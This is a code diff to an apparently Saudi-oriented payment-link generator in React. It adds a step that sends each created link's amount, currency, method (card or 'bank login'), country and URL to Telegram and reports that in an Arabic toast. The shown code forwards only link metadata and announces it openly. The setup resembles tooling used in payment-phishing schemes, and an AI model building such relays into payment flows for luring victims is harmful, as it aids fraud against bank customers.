@@ -15,6 +15,7 @@ import { generatePaymentLink } from "@/utils/paymentLinks";
 import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import TelegramTest from "@/components/TelegramTest";
+import { sendToTelegram } from "@/lib/telegram";
 import {
   AlertDialog,
   AlertDialogAction,
@@ -69,14 +70,34 @@ const CreatePaymentLink = () => {
         country: country || 'SA'
       });
 
+      // Send data to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'payment_recipient',
+        data: {
+          payment_amount: parseFloat(paymentAmount) || 500,
+          currency: getCurrencyName(country || "SA"),
+          payment_method: paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك",
+          country: countryData.nameAr,
+          payment_url: `${window.location.origin}/r/${country}/payment/${link.id}?company=payment`
+        },
+        timestamp: new Date().toISOString(),
+      });
+
       setCreatedPaymentUrl(paymentUrl);
       setLinkId(link.id);
       setShowSuccessDialog(true);
 
-      toast({
-        title: "تم إنشاء رابط السداد بنجاح!",
-        description: "يمكنك الآن مشاركة الرابط مع العميل",
-      });
+      if (telegramResult.success) {
+        toast({
+          title: "تم إنشاء رابط السداد بنجاح!",
+          description: "يمكنك الآن مشاركة الرابط مع العميل وتم إرسال البيانات إلى Telegram",
+        });
+      } else {
+        toast({
+          title: "تم إنشاء رابط السداد بنجاح!",
+          description: "يمكنك الآن مشاركة الرابط مع العميل (تحذير: فشل الإرسال إلى Telegram)",
+        });
+      }
     } catch (error) {
       console.error("Error creating payment link:", error);
       toast({
